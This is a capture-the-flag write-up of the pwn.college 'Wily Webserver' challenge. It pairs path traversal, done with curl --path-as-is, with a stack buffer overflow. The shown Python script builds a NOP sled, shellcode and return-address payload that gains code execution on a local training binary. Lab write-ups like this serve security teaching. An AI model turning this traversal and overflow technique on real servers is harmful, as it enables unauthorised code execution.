## 🔓 Wily Webserver — Write-up

**Challenge Type**: Web + Binary Exploitation
**Source**: \[pwn.college - Integrated Security Module]
**Category**: Path Traversal, Stack Overflow, Remote Shellcode Execution

---

### 📘 Overview

The target binary is a custom web server that:

* Receives HTTP requests via a socket.
* Parses the method, path, and HTTP version.
* Uses the path to read and send back file contents from `/challenge/files/`.

Our goal: **Achieve code execution via a crafted payload passed through the web server.**

---

### 🧠 Initial Observations

```c
void handle_connection(int client_fd)
{
    char request[8192] = { 0 };
    char method[8] = { 0 };
    char version[10] = { 0 };
    char path[256] = { 0 };
    char resolved_path[512] = { 0 };

    read(client_fd, request, 1000);
    sscanf(request, "%7s %255s %9s", method, path, version);

    REQUIRE(strcmp(method, "GET") == 0, 501);
    REQUIRE(strcmp(version, "HTTP/1.1") == 0, 400);

    sprintf(resolved_path, "/challenge/files/%s", path);
    send_file(client_fd, resolved_path);
}
```

* The `read()` call receives up to 1000 bytes of the request.
* `sscanf` extracts method, path, version — vulnerable if the request is long enough to overflow.
* The final path is resolved with a fixed base: `/challenge/files/%s`.

---

### 🚧 Initial Attempts & Failures

1. **Normal Path Traversal**:
   Tried inputs like `../../etc/passwd` or `..%2F..%2F` — all got **sanitized**.

2. **Encoding Tricks**:

   * URL encoding (`%2e%2e%2f`)
   * Double encoding (`%252e%252e%252f`)
     All failed — the input was sanitized before `sprintf`.

3. **Investigation**:

   * `sscanf` was *not* the culprit.
   * Debugging showed that the **raw data passed to `read()` was already sanitized**.

   This meant the binary likely used a **custom web server** that auto-normalized the request path, making traversal tricky.

---

### ✅ Breakthrough

The key was using:

```bash
curl --path-as-is "http://localhost/../../home/hacker/Desktop/intro_to_cybersecurity/integrated_security/wily_webserver/payload.txt"
```

* The `--path-as-is` flag in `curl` **bypasses the client's automatic normalization** of the URL path.
* This allowed full traversal out of `/challenge/files/`, all the way to our user-controlled `payload.txt`.

---

### 💣 Exploit Strategy

1. **Create Payload with Shellcode**:

   * Use a crafted shellcode (in `shellcode.bin`) to open a shell.
   * Add a **NOP sled** to ensure safe jumps.
   * Use padding + exact **stack address** from GDB to overwrite the return address.

2. **Python Code to Generate Payload**:

   ```python
   from pwn import *
   import struct

   jump_addr = 0x7fffffffaa00  # stack address for shellcode
   offset = 8015               # offset to return address

   with open("shellcode.bin", "rb") as f:
       shellcode = f.read()

   shellcode = b"\x90" * 23 + shellcode  # NOP sled
   padding = b"A" * (offset - len(shellcode))
   payload = shellcode + padding + struct.pack("<Q", jump_addr)

   with open("payload.txt", "wb") as f:
       f.write(payload)
   ```

3. **Confirming Stack Consistency**:

   * The exploit was tested using `gdb` with a clean environment.
   * To match this in real execution, launch the binary without environment variables:

     ```bash
     env -i /challenge/integration-web-overflow
     ```

---

### 🧩 Key Takeaways

* **Path traversal isn’t only about server-side logic** — *client behavior like auto-normalization also matters*.
* `curl`’s `--path-as-is` flag is critical for bypassing client-side cleaning.
* Exploiting stack-based overflows via web input requires **precise control over addresses**, and matching GDB/debug runtime to real execution.
* File system restrictions can be bypassed with traversal if parsing isn’t fully secure.

---

### 🏁 Final Exploit Execution

```bash
curl --path-as-is "http://localhost/../../home/hacker/Desktop/intro_to_cybersecurity/integrated_security/wily_webserver/payload.txt"
```

The server reads and `send_file()`s the payload from our path-traversed file — causing return address overwrite and **shellcode execution**.
